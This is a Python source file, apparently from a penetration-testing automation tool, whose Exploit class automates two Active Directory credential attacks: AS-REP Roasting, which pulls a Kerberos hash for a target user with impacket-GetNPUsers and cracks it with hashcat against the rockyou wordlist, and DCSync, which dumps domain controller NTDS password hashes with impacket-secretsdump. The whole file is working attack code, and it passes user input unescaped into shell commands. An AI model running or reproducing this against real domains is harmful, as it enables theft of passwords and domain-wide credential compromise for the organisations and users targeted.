import subprocess
from Util.writeHelper import *
import re

class Exploit:
    
    def __init__(self, ip, domain, name):
        self.name = name
        self.domain = domain
        self.ip = ip
        self._EXPLOIT_DATA = {
            'AS-REP Roasting': self.as_rep_roasting,
            'DCSync': self.dcsync,
        }

    def run(self):
        self._EXPLOIT_DATA[self.name]()


    def as_rep_roasting(self):
        username = input("\nEnter the target username: ")
        print(green_message(f'\n[*] Requesting AS_REP message hash from {username}\n'))
        req = subprocess.run(["impacket-GetNPUsers", f'{self.domain}/{username}', '-no-pass'], capture_output=True).stdout.decode('utf-8')
        print(req)
        hash = re.search(r'\$krb5asrep\$.*', req).group(0)
        # print(green_message(f'[*] AS_REP hash: {hash.encode()}'))
        print(green_message(f'[*] Cracking the collected hash\n'))
        command = f"hashcat -m 18200 --force -a 0 '{hash}' /usr/share/wordlists/rockyou.txt > /dev/null"
        print(f'[*] Running hashcat: {command}\n')
        
        subprocess.run(command, shell=True)
        
        print(green_message(f'[*] Finished cracking the hash\n'))
        print(green_message(f'[*] Getting the password\n'))
        command = f"hashcat -m 18200 --show '{hash}'"
        print(f'[*] Running hashcat: {command}\n')
        result = subprocess.run(command, shell=True, capture_output=True).stdout.decode('utf-8')
        if result:
            print(green_message(f'[*] Cracked hash: {result}'))
        else:
            print(red_message(f'[-] Failed to crack the hash'))
    
    def dcsync(self):
        credential = input("\nEnter the vulnerable credential (username:password): ")
        print(green_message(f'\n[*] Using secretdump for dumping NTDS secret\n'))
        command = f"impacket-secretsdump -just-dc {credential}@{self.domain} -outputfile dcsync_hashes"
        print(f'[*] Running secretdump: {command}\n')
        
        subprocess.run(command, shell=True)